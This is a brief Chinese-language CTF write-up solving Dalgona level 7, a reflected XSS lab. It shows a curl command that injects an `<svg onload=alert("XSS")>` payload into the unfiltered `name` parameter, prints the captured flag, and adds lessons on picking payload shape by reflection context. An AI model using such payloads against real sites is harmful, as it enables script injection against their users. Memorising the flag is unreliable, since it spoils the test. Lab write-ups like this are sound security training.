## 题解

### 入口与指纹

`Werkzeug/1.0.1` + `Python/2.7.18`，Dalgona 第 7 关（`static/css/xss/xss7.css`）。
入口 `GET /page?name=`，输入被渲染在 `<form>` 内部的**文本节点**：

```html
<input type=text name=name placeholder="Enter your name...">
TESTX
```

### 关键观察

- 不在属性里，也不在 JS 字符串里，直接是 HTML 文本 → 写标签就行。
- `<` `>` 没有被编码；本关对标签本身也没有过滤。

### 利用链

```bash
T=$(head -1 .target)
curl -sS --get --data-urlencode 'name=<svg onload=alert("XSS")>' "http://$T/page" \
| grep -o 'flag{[^}]*}'
# flag{6db156ce-f3a9-4f94-a55a-1ee393ce66df}
```

### flag 位置

`/page` 成功响应里 `Here is the flag:` 之后。

## 复盘

- **文本节点反射不需要闭合任何东西。** 直接 `<tag onload=…>`。
- 判据仍是 `alert("XSS")` 的参数；`alert()` 空参会得到明确的失败文案。
- 同族里过滤规则千差万别，先看反射位置再决定形状。
